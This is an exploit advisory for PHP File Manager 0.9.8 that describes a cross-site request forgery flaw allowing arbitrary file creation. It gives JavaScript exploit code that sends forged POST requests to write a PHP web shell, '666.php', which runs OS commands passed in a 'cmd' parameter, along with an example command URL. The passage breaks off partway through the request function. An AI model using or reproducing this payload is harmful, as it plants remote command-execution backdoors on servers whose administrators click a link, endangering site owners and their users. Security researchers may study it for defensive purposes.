Vulnerability Details:
=======================================================================
PHP File Manager is vulnerable to creation of arbitrary files on server
via CSRF which we can use to create remote backdoor shell access if victim
clicks our malicious linx or visits our malicious webpages. 

To create backdoor shell we will need to execute two POST requests

e.g.
https://localhost/phpFileManager-0.9.8/666.php?cmd=[ OS command ] 


Exploit code(s):

<script>
var scripto="frame=3&action=2&dir_dest=2&chmod_arg=&cmd_arg=666.php&current_dir=&selected_dir_list=&selected_file_list="
blasphemer(scripto)

var maliciouso="action=7&save_file=1&current_dir=.&filename=666.php&file_data='<?php+echo+'backdoor shell by hyp3rlinx......';+exec($_GET['cmd']);+?>"
blasphemer(maliciouso)

function blasphemer(payload){
 var xhr=new XMLHttpRequest()
 xhr.open('POST',"https://localhost/phpFileManager-0.9.8/index.php", true)
